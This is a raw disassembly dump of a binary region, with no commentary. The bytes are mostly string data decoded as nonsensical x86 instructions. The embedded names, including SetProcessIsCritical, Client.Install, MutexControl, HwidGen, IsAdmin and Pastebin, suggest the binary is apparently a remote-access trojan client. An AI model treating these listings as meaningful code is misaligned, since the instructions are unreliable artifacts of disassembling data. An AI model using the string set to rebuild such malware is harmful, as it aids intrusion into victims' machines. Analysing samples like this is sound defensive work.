  40869b:	53                   	push   %ebx
  40869c:	65 74 50             	gs je  0x4086ef
  40869f:	72 6f                	jb     0x408710
  4086a1:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086a4:	73 49                	jae    0x4086ef
  4086a6:	73 43                	jae    0x4086eb
  4086a8:	72 69                	jb     0x408713
  4086aa:	74 69                	je     0x408715
  4086ac:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086af:	00 50 72             	add    %dl,0x72(%eax)
  4086b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086b6:	73 43                	jae    0x4086fb
  4086b8:	72 69                	jb     0x408723
  4086ba:	74 69                	je     0x408725
  4086bc:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086bf:	00 4e 65             	add    %cl,0x65(%esi)
  4086c2:	74 77                	je     0x40873b
  4086c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c5:	72 6b                	jb     0x408732
  4086c7:	43                   	inc    %ebx
  4086c8:	72 65                	jb     0x40872f
  4086ca:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086cd:	74 69                	je     0x408738
  4086cf:	61                   	popa
  4086d0:	6c                   	insb   (%dx),%es:(%edi)
  4086d1:	00 53 79             	add    %dl,0x79(%ebx)
  4086d4:	73 74                	jae    0x40874a
  4086d6:	65 6d                	gs insl (%dx),%es:(%edi)
  4086d8:	2e 53                	cs push %ebx
  4086da:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086de:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086e5:	6e 
  4086e6:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086e9:	61                   	popa
  4086ea:	6c                   	insb   (%dx),%es:(%edi)
  4086eb:	00 57 69             	add    %dl,0x69(%edi)
  4086ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4086ef:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086f1:	77 73                	ja     0x408766
  4086f3:	50                   	push   %eax
  4086f4:	72 69                	jb     0x40875f
  4086f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f7:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086fa:	61                   	popa
  4086fb:	6c                   	insb   (%dx),%es:(%edi)
  4086fc:	00 41 72             	add    %al,0x72(%ecx)
  4086ff:	65 45                	gs inc %ebp
  408701:	71 75                	jno    0x408778
  408703:	61                   	popa
  408704:	6c                   	insb   (%dx),%es:(%edi)
  408705:	00 67 65             	add    %ah,0x65(%edi)
  408708:	74 5f                	je     0x408769
  40870a:	49                   	dec    %ecx
  40870b:	6e                   	outsb  %ds:(%esi),(%dx)
  40870c:	74 65                	je     0x408773
  40870e:	72 76                	jb     0x408786
  408710:	61                   	popa
  408711:	6c                   	insb   (%dx),%es:(%edi)
  408712:	00 73 65             	add    %dh,0x65(%ebx)
  408715:	74 5f                	je     0x408776
  408717:	49                   	dec    %ecx
  408718:	6e                   	outsb  %ds:(%esi),(%dx)
  408719:	74 65                	je     0x408780
  40871b:	72 76                	jb     0x408793
  40871d:	61                   	popa
  40871e:	6c                   	insb   (%dx),%es:(%edi)
  40871f:	00 43 6c             	add    %al,0x6c(%ebx)
  408722:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  408729:	73 74                	jae    0x40879f
  40872b:	61                   	popa
  40872c:	6c                   	insb   (%dx),%es:(%edi)
  40872d:	6c                   	insb   (%dx),%es:(%edi)
  40872e:	00 6b 65             	add    %ch,0x65(%ebx)
  408731:	72 6e                	jb     0x4087a1
  408733:	65 6c                	gs insb (%dx),%es:(%edi)
  408735:	33 32                	xor    (%edx),%esi
  408737:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40873a:	6c                   	insb   (%dx),%es:(%edi)
  40873b:	00 75 73             	add    %dh,0x73(%ebp)
  40873e:	65 72 33             	gs jb  0x408774
  408741:	32 2e                	xor    (%esi),%ch
  408743:	64 6c                	fs insb (%dx),%es:(%edi)
  408745:	6c                   	insb   (%dx),%es:(%edi)
  408746:	00 6e 74             	add    %ch,0x74(%esi)
  408749:	64 6c                	fs insb (%dx),%es:(%edi)
  40874b:	6c                   	insb   (%dx),%es:(%edi)
  40874c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40874f:	6c                   	insb   (%dx),%es:(%edi)
  408750:	00 4b 69             	add    %cl,0x69(%ebx)
  408753:	6c                   	insb   (%dx),%es:(%edi)
  408754:	6c                   	insb   (%dx),%es:(%edi)
  408755:	00 50 6f             	add    %dl,0x6f(%eax)
  408758:	6c                   	insb   (%dx),%es:(%edi)
  408759:	6c                   	insb   (%dx),%es:(%edi)
  40875a:	00 57 72             	add    %dl,0x72(%edi)
  40875d:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  408764:	00 
  408765:	53                   	push   %ebx
  408766:	65 74 41             	gs je  0x4087aa
  408769:	73 4e                	jae    0x4087b9
  40876b:	75 6c                	jne    0x4087d9
  40876d:	6c                   	insb   (%dx),%es:(%edi)
  40876e:	00 4d 75             	add    %cl,0x75(%ebp)
  408771:	74 65                	je     0x4087d8
  408773:	78 43                	js     0x4087b8
  408775:	6f                   	outsl  %ds:(%esi),(%dx)
  408776:	6e                   	outsb  %ds:(%esi),(%dx)
  408777:	74 72                	je     0x4087eb
  408779:	6f                   	outsl  %ds:(%esi),(%dx)
  40877a:	6c                   	insb   (%dx),%es:(%edi)
  40877b:	00 45 6e             	add    %al,0x6e(%ebp)
  40877e:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408781:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  408785:	72 65                	jb     0x4087ec
  408787:	61                   	popa
  408788:	6d                   	insl   (%dx),%es:(%edi)
  408789:	00 46 69             	add    %al,0x69(%esi)
  40878c:	6c                   	insb   (%dx),%es:(%edi)
  40878d:	65 53                	gs push %ebx
  40878f:	74 72                	je     0x408803
  408791:	65 61                	gs popa
  408793:	6d                   	insl   (%dx),%es:(%edi)
  408794:	00 4e 65             	add    %cl,0x65(%esi)
  408797:	74 77                	je     0x408810
  408799:	6f                   	outsl  %ds:(%esi),(%dx)
  40879a:	72 6b                	jb     0x408807
  40879c:	53                   	push   %ebx
  40879d:	74 72                	je     0x408811
  40879f:	65 61                	gs popa
  4087a1:	6d                   	insl   (%dx),%es:(%edi)
  4087a2:	00 53 73             	add    %dl,0x73(%ebx)
  4087a5:	6c                   	insb   (%dx),%es:(%edi)
  4087a6:	53                   	push   %ebx
  4087a7:	74 72                	je     0x40881b
  4087a9:	65 61                	gs popa
  4087ab:	6d                   	insl   (%dx),%es:(%edi)
  4087ac:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b1:	64 65 46             	fs gs inc %esi
  4087b4:	72 6f                	jb     0x408825
  4087b6:	6d                   	insl   (%dx),%es:(%edi)
  4087b7:	53                   	push   %ebx
  4087b8:	74 72                	je     0x40882c
  4087ba:	65 61                	gs popa
  4087bc:	6d                   	insl   (%dx),%es:(%edi)
  4087bd:	00 43 72             	add    %al,0x72(%ebx)
  4087c0:	79 70                	jns    0x408832
  4087c2:	74 6f                	je     0x408833
  4087c4:	53                   	push   %ebx
  4087c5:	74 72                	je     0x408839
  4087c7:	65 61                	gs popa
  4087c9:	6d                   	insl   (%dx),%es:(%edi)
  4087ca:	00 47 5a             	add    %al,0x5a(%edi)
  4087cd:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087d4:	6d                   	insl   (%dx),%es:(%edi)
  4087d5:	00 4d 65             	add    %cl,0x65(%ebp)
  4087d8:	6d                   	insl   (%dx),%es:(%edi)
  4087d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4087da:	72 79                	jb     0x408855
  4087dc:	53                   	push   %ebx
  4087dd:	74 72                	je     0x408851
  4087df:	65 61                	gs popa
  4087e1:	6d                   	insl   (%dx),%es:(%edi)
  4087e2:	00 50 72             	add    %dl,0x72(%eax)
  4087e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e6:	67 72 61             	addr16 jb 0x40884a
  4087e9:	6d                   	insl   (%dx),%es:(%edi)
  4087ea:	00 67 65             	add    %ah,0x65(%edi)
  4087ed:	74 5f                	je     0x40884e
  4087ef:	49                   	dec    %ecx
  4087f0:	74 65                	je     0x408857
  4087f2:	6d                   	insl   (%dx),%es:(%edi)
  4087f3:	00 67 65             	add    %ah,0x65(%edi)
  4087f6:	74 5f                	je     0x408857
  4087f8:	49                   	dec    %ecx
  4087f9:	73 36                	jae    0x408831
  4087fb:	34 42                	xor    $0x42,%al
  4087fd:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408804:	74 
  408805:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  40880c:	65 6d                	gs insl (%dx),%es:(%edi)
  40880e:	00 43 6c             	add    %al,0x6c(%ebx)
  408811:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  408818:	67 6f                	outsl  %ds:(%si),(%dx)
  40881a:	72 69                	jb     0x408885
  40881c:	74 68                	je     0x408886
  40881e:	6d                   	insl   (%dx),%es:(%edi)
  40881f:	00 53 79             	add    %dl,0x79(%ebx)
  408822:	6d                   	insl   (%dx),%es:(%edi)
  408823:	6d                   	insl   (%dx),%es:(%edi)
  408824:	65 74 72             	gs je  0x408899
  408827:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40882e:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408835:	79 
  408836:	6d                   	insl   (%dx),%es:(%edi)
  408837:	6d                   	insl   (%dx),%es:(%edi)
  408838:	65 74 72             	gs je  0x4088ad
  40883b:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408842:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408849:	73 
  40884a:	68 41 6c 67 6f       	push   $0x6f676c41
  40884f:	72 69                	jb     0x4088ba
  408851:	74 68                	je     0x4088bb
  408853:	6d                   	insl   (%dx),%es:(%edi)
  408854:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408858:	6d                   	insl   (%dx),%es:(%edi)
  408859:	00 52 61             	add    %dl,0x61(%edx)
  40885c:	6e                   	outsb  %ds:(%esi),(%dx)
  40885d:	64 6f                	outsl  %fs:(%esi),(%dx)
  40885f:	6d                   	insl   (%dx),%es:(%edi)
  408860:	00 49 43             	add    %cl,0x43(%ecx)
  408863:	72 79                	jb     0x4088de
  408865:	70 74                	jo     0x4088db
  408867:	6f                   	outsl  %ds:(%esi),(%dx)
  408868:	54                   	push   %esp
  408869:	72 61                	jb     0x4088cc
  40886b:	6e                   	outsb  %ds:(%esi),(%dx)
  40886c:	73 66                	jae    0x4088d4
  40886e:	6f                   	outsl  %ds:(%esi),(%dx)
  40886f:	72 6d                	jb     0x4088de
  408871:	00 4d 73             	add    %cl,0x73(%ebp)
  408874:	67 50                	addr16 push %eax
  408876:	61                   	popa
  408877:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  40887a:	6e                   	outsb  %ds:(%esi),(%dx)
  40887b:	75 6d                	jne    0x4088ea
  40887d:	00 57 72             	add    %dl,0x72(%edi)
  408880:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  408887:	65 
  408888:	61                   	popa
  408889:	6e                   	outsb  %ds:(%esi),(%dx)
  40888a:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40888e:	6f                   	outsl  %ds:(%esi),(%dx)
  40888f:	6f                   	outsl  %ds:(%esi),(%dx)
  408890:	6c                   	insb   (%dx),%es:(%edi)
  408891:	65 61                	gs popa
  408893:	6e                   	outsb  %ds:(%esi),(%dx)
  408894:	00 53 65             	add    %dl,0x65(%ebx)
  408897:	74 41                	je     0x4088da
  408899:	73 42                	jae    0x4088dd
  40889b:	6f                   	outsl  %ds:(%esi),(%dx)
  40889c:	6f                   	outsl  %ds:(%esi),(%dx)
  40889d:	6c                   	insb   (%dx),%es:(%edi)
  40889e:	65 61                	gs popa
  4088a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a1:	00 48 77             	add    %cl,0x77(%eax)
  4088a4:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088ab:	65 
  4088ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ad:	00 63 68             	add    %ah,0x68(%ebx)
  4088b0:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088b7:	4d 
  4088b8:	61                   	popa
  4088b9:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088c0:	43                   	inc    %ebx
  4088c1:	68 61 69 6e 00       	push   $0x6e6961
  4088c6:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088c9:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d1:	6d                   	insl   (%dx),%es:(%edi)
  4088d2:	61                   	popa
  4088d3:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088da:	43                   	inc    %ebx
  4088db:	75 72                	jne    0x40894f
  4088dd:	72 65                	jb     0x408944
  4088df:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e0:	74 44                	je     0x408926
  4088e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e3:	6d                   	insl   (%dx),%es:(%edi)
  4088e4:	61                   	popa
  4088e5:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088ec:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088f0:	00 49 73             	add    %cl,0x73(%ecx)
  4088f3:	41                   	inc    %ecx
  4088f4:	64 6d                	fs insl (%dx),%es:(%edi)
  4088f6:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4088fd:	00 47 65             	add    %al,0x65(%edi)
  408900:	74 46                	je     0x408948
  408902:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408909:	57 
  40890a:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408911:	78 
  408912:	74 65                	je     0x408979
  408914:	6e                   	outsb  %ds:(%esi),(%dx)
  408915:	73 69                	jae    0x408980
  408917:	6f                   	outsl  %ds:(%esi),(%dx)
  408918:	6e                   	outsb  %ds:(%esi),(%dx)
  408919:	00 67 65             	add    %ah,0x65(%edi)
  40891c:	74 5f                	je     0x40897d
  40891e:	4f                   	dec    %edi
  40891f:	53                   	push   %ebx
  408920:	56                   	push   %esi
  408921:	65 72 73             	gs jb  0x408997
  408924:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40892b:	74 65                	je     0x408992
  40892d:	6d                   	insl   (%dx),%es:(%edi)
  40892e:	2e 49                	cs dec %ecx
  408930:	4f                   	dec    %edi
  408931:	2e 43                	cs inc %ebx
  408933:	6f                   	outsl  %ds:(%esi),(%dx)
  408934:	6d                   	insl   (%dx),%es:(%edi)
  408935:	70 72                	jo     0x4089a9
  408937:	65 73 73             	gs jae 0x4089ad
  40893a:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408941:	6c                   	insb   (%dx),%es:(%edi)
  408942:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408949:	00 53 79             	add    %dl,0x79(%ebx)
  40894c:	73 74                	jae    0x4089c2
  40894e:	65 6d                	gs insl (%dx),%es:(%edi)
  408950:	2e 53                	cs push %ebx
  408952:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408956:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  40895d:	68 
  40895e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408960:	74 69                	je     0x4089cb
  408962:	63 61 74             	arpl   %esp,0x74(%ecx)
  408965:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40896c:	74 65                	je     0x4089d3
  40896e:	6d                   	insl   (%dx),%es:(%edi)
  40896f:	2e 52                	cs push %edx
  408971:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408974:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408979:	6e                   	outsb  %ds:(%esi),(%dx)
  40897a:	00 58 35             	add    %bl,0x35(%eax)
  40897d:	30 39                	xor    %bh,(%ecx)
  40897f:	43                   	inc    %ebx
  408980:	65 72 74             	gs jb  0x4089f7
  408983:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40898a:	43                   	inc    %ebx
  40898b:	6f                   	outsl  %ds:(%esi),(%dx)
  40898c:	6c                   	insb   (%dx),%es:(%edi)
  40898d:	6c                   	insb   (%dx),%es:(%edi)
  40898e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408993:	6e                   	outsb  %ds:(%esi),(%dx)
  408994:	00 4d 61             	add    %cl,0x61(%ebp)
  408997:	6e                   	outsb  %ds:(%esi),(%dx)
  408998:	61                   	popa
  408999:	67 65 6d             	gs insl (%dx),%es:(%di)
  40899c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40899e:	74 4f                	je     0x4089ef
  4089a0:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089a3:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089a7:	6c                   	insb   (%dx),%es:(%edi)
  4089a8:	6c                   	insb   (%dx),%es:(%edi)
  4089a9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4089af:	00 43 6c             	add    %al,0x6c(%ebx)
  4089b2:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c1:	00 73 65             	add    %dh,0x65(%ebx)
  4089c4:	74 5f                	je     0x408a25
  4089c6:	50                   	push   %eax
  4089c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4089c8:	73 69                	jae    0x408a33
  4089ca:	74 69                	je     0x408a35
  4089cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ce:	00 70 6f             	add    %dh,0x6f(%eax)
  4089d1:	73 69                	jae    0x408a3c
  4089d3:	74 69                	je     0x408a3e
  4089d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d7:	00 43 72             	add    %al,0x72(%ebx)
  4089da:	79 70                	jns    0x408a4c
  4089dc:	74 6f                	je     0x408a4d
  4089de:	67 72 61             	addr16 jb 0x408a42
  4089e1:	70 68                	jo     0x408a4b
  4089e3:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089ea:	74 69                	je     0x408a55
  4089ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ee:	00 41 72             	add    %al,0x72(%ecx)
  4089f1:	67 75 6d             	addr16 jne 0x408a61
  4089f4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089f6:	74 4e                	je     0x408a46
  4089f8:	75 6c                	jne    0x408a66
  4089fa:	6c                   	insb   (%dx),%es:(%edi)
  4089fb:	45                   	inc    %ebp
  4089fc:	78 63                	js     0x408a61
  4089fe:	65 70 74             	gs jo  0x408a75
  408a01:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a08:	75 6d                	jne    0x408a77
  408a0a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a0c:	74 45                	je     0x408a53
  408a0e:	78 63                	js     0x408a73
  408a10:	65 70 74             	gs jo  0x408a87
  408a13:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a1a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a1b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a1c:	77 6e                	ja     0x408a8c
  408a1e:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a21:	61                   	popa
  408a22:	67 65 43             	addr16 gs inc %ebx
  408a25:	6f                   	outsl  %ds:(%esi),(%dx)
  408a26:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a2b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a2d:	00 53 65             	add    %dl,0x65(%ebx)
  408a30:	6e                   	outsb  %ds:(%esi),(%dx)
  408a31:	64 49                	fs dec %ecx
  408a33:	6e                   	outsb  %ds:(%esi),(%dx)
  408a34:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a36:	00 46 69             	add    %al,0x69(%esi)
  408a39:	6c                   	insb   (%dx),%es:(%edi)
  408a3a:	65 49                	gs dec %ecx
  408a3c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a3f:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a43:	76 65                	jbe    0x408aaa
  408a45:	49                   	dec    %ecx
  408a46:	6e                   	outsb  %ds:(%esi),(%dx)
  408a47:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a49:	00 46 69             	add    %al,0x69(%esi)
  408a4c:	6c                   	insb   (%dx),%es:(%edi)
  408a4d:	65 53                	gs push %ebx
  408a4f:	79 73                	jns    0x408ac4
  408a51:	74 65                	je     0x408ab8
  408a53:	6d                   	insl   (%dx),%es:(%edi)
  408a54:	49                   	dec    %ecx
  408a55:	6e                   	outsb  %ds:(%esi),(%dx)
  408a56:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a58:	00 43 6f             	add    %al,0x6f(%ebx)
  408a5b:	6d                   	insl   (%dx),%es:(%edi)
  408a5c:	70 75                	jo     0x408ad3
  408a5e:	74 65                	je     0x408ac5
  408a60:	72 49                	jb     0x408aab
  408a62:	6e                   	outsb  %ds:(%esi),(%dx)
  408a63:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a65:	00 43 53             	add    %al,0x53(%ebx)
  408a68:	68 61 72 70 41       	push   $0x41707261
  408a6d:	72 67                	jb     0x408ad6
  408a6f:	75 6d                	jne    0x408ade
  408a71:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a73:	74 49                	je     0x408abe
  408a75:	6e                   	outsb  %ds:(%esi),(%dx)
  408a76:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a78:	00 50 72             	add    %dl,0x72(%eax)
  408a7b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a7c:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a7f:	73 53                	jae    0x408ad4
  408a81:	74 61                	je     0x408ae4
  408a83:	72 74                	jb     0x408af9
  408a85:	49                   	dec    %ecx
  408a86:	6e                   	outsb  %ds:(%esi),(%dx)
  408a87:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a89:	00 57 72             	add    %dl,0x72(%edi)
  408a8c:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a93:	50 
  408a94:	72 65                	jb     0x408afb
  408a96:	76 65                	jbe    0x408afd
  408a98:	6e                   	outsb  %ds:(%esi),(%dx)
  408a99:	74 53                	je     0x408aee
  408a9b:	6c                   	insb   (%dx),%es:(%edi)
  408a9c:	65 65 70 00          	gs gs jo 0x408aa0
  408aa0:	5a                   	pop    %edx
  408aa1:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408aa8:	65 6e                	outsb  %gs:(%esi),(%dx)
  408aaa:	74 41                	je     0x408aed
  408aac:	70 70                	jo     0x408b1e
  408aae:	00 4d 69             	add    %cl,0x69(%ebp)
  408ab1:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408ab4:	73 6f                	jae    0x408b25
  408ab6:	66 74 2e             	data16 je 0x408ae7
  408ab9:	43                   	inc    %ebx
  408aba:	53                   	push   %ebx
  408abb:	68 61 72 70 00       	push   $0x707261
  408ac0:	47                   	inc    %edi
  408ac1:	72 6f                	jb     0x408b32
  408ac3:	75 70                	jne    0x408b35
  408ac5:	00 4e 6f             	add    %cl,0x6f(%esi)
  408ac8:	72 6d                	jb     0x408b37
  408aca:	61                   	popa
  408acb:	6c                   	insb   (%dx),%es:(%edi)
  408acc:	53                   	push   %ebx
  408acd:	74 61                	je     0x408b30
  408acf:	72 74                	jb     0x408b45
  408ad1:	75 70                	jne    0x408b43
  408ad3:	00 53 79             	add    %dl,0x79(%ebx)
  408ad6:	73 74                	jae    0x408b4c
  408ad8:	65 6d                	gs insl (%dx),%es:(%edi)
  408ada:	2e 4c                	cs dec %esp
  408adc:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408ae3:	61                   	popa
  408ae4:	72 00                	jb     0x408ae6
  408ae6:	43                   	inc    %ebx
  408ae7:	68 61 72 00 49       	push   $0x49007261
  408aec:	6e                   	outsb  %ds:(%esi),(%dx)
  408aed:	76 6f                	jbe    0x408b5e
  408aef:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408af3:	6d                   	insl   (%dx),%es:(%edi)
  408af4:	62 65 72             	bound  %esp,0x72(%ebp)
  408af7:	00 4d 44             	add    %cl,0x44(%ebp)
  408afa:	35 43 72 79 70       	xor    $0x70797243,%eax
  408aff:	74 6f                	je     0x408b70
  408b01:	53                   	push   %ebx
  408b02:	65 72 76             	gs jb  0x408b7b
  408b05:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b0c:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b13:	41 
  408b14:	43                   	inc    %ebx
  408b15:	72 79                	jb     0x408b90
  408b17:	70 74                	jo     0x408b8d
  408b19:	6f                   	outsl  %ds:(%esi),(%dx)
  408b1a:	53                   	push   %ebx
  408b1b:	65 72 76             	gs jb  0x408b94
  408b1e:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b25:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b2c:	73 
  408b2d:	43                   	inc    %ebx
  408b2e:	72 79                	jb     0x408ba9
  408b30:	70 74                	jo     0x408ba6
  408b32:	6f                   	outsl  %ds:(%esi),(%dx)
  408b33:	53                   	push   %ebx
  408b34:	65 72 76             	gs jb  0x408bad
  408b37:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b3e:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b45:	72 
  408b46:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b4d:	64 65 72 00          	fs gs jb 0x408b51
  408b51:	49                   	dec    %ecx
  408b52:	6e                   	outsb  %ds:(%esi),(%dx)
  408b53:	73 74                	jae    0x408bc9
  408b55:	61                   	popa
  408b56:	6c                   	insb   (%dx),%es:(%edi)
  408b57:	6c                   	insb   (%dx),%es:(%edi)
  408b58:	46                   	inc    %esi
  408b59:	6f                   	outsl  %ds:(%esi),(%dx)
  408b5a:	6c                   	insb   (%dx),%es:(%edi)
  408b5b:	64 65 72 00          	fs gs jb 0x408b5f
  408b5f:	49                   	dec    %ecx
  408b60:	64 53                	fs push %ebx
  408b62:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b64:	64 65 72 00          	fs gs jb 0x408b68
  408b68:	73 65                	jae    0x408bcf
  408b6a:	6e                   	outsb  %ds:(%esi),(%dx)
  408b6b:	64 65 72 00          	fs gs jb 0x408b6f
  408b6f:	4d                   	dec    %ebp
  408b70:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b77:	74 2e                	je     0x408ba7
  408b79:	43                   	inc    %ebx
  408b7a:	53                   	push   %ebx
  408b7b:	68 61 72 70 2e       	push   $0x2e707261
  408b80:	52                   	push   %edx
  408b81:	75 6e                	jne    0x408bf1
  408b83:	74 69                	je     0x408bee
  408b85:	6d                   	insl   (%dx),%es:(%edi)
  408b86:	65 42                	gs inc %edx
  408b88:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b8f:	61                   	popa
  408b90:	6c                   	insb   (%dx),%es:(%edi)
  408b91:	6c                   	insb   (%dx),%es:(%edi)
  408b92:	53                   	push   %ebx
  408b93:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408b9a:	65 
  408b9b:	72 00                	jb     0x408b9d
  408b9d:	47                   	inc    %edi
  408b9e:	65 74 45             	gs je  0x408be6
  408ba1:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba2:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408ba5:	65 72 00             	gs jb  0x408ba8
  408ba8:	67 65 74 5f          	addr16 gs je 0x408c0b
  408bac:	42                   	inc    %edx
  408bad:	75 66                	jne    0x408c15
